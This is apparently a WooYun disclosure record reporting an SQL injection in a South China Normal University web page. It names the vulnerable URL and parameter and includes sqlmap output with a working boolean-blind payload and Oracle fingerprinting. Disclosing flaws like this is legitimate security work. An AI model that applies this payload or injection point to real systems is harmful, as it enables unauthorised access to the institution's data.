wybug_title: 华南师范大学某站SQL injection
wybug_status: 已交由第三方合作机构(CCERT教育网应急响应组)处理
wybug_detail:
漏洞详情 披露状态：   									2015-03-25：	细节已通知厂商并且等待厂商处理中									2015-03-30：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： 不经意发现的，这个点影响问题不是太大，其他的没做深入测试，不过目测整站还存在其他类型的注入点，望管理重视对各种数据提交的处理过滤 详细说明：  
http://amd.scnu.edu.cn/eam/homepage/home/viewCenterframe.jsp?id=49000&type=5%27





[21:04:35] [INFO] GET parameter 'id' seems to be 'AND boolean-based blind - WHERE or HAVING clause' injectable[21:04:35] [WARNING] reflective value(s) found and filtering out[21:04:38] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause'[21:04:38] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'[21:04:38] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause'[21:04:38] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'[21:04:39] [INFO] testing 'MySQL inline queries'[21:04:39] [INFO] testing 'PostgreSQL inline queries'[21:04:39] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'[21:04:39] [INFO] testing 'Oracle inline queries'[21:04:39] [INFO] testing 'SQLite inline queries'[21:04:39] [INFO] testing 'MySQL > 5.0.11 stacked queries'[21:04:39] [INFO] testing 'PostgreSQL > 8.1 stacked queries'[21:04:39] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries'[21:04:39] [INFO] testing 'MySQL > 5.0.11 AND time-based blind'[21:04:39] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'[21:04:40] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind'[21:04:40] [INFO] testing 'Oracle AND time-based blind'[21:04:40] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'[21:04:40] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found[21:04:47] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'[21:04:47] [WARNING] using unescaped version of the test because of zero knowledge of the back-end DBMS. You can try to explicitly set it using option '--dbms'[21:04:55] [INFO] checking if the injection point on GET parameter 'id' is a false positiveGET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N]sqlmap identified the following injection points with a total of 83 HTTP(s) requests:---Parameter: id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=49000' AND 6041=6041 AND 'fjla'='fjla&type=5---[21:05:27] [INFO] testing MySQL[21:05:27] [WARNING] the back-end DBMS is not MySQL[21:05:27] [INFO] testing Oracle[21:05:28] [INFO] confirming Oracle[21:05:28] [INFO] the back-end DBMS is Oracle
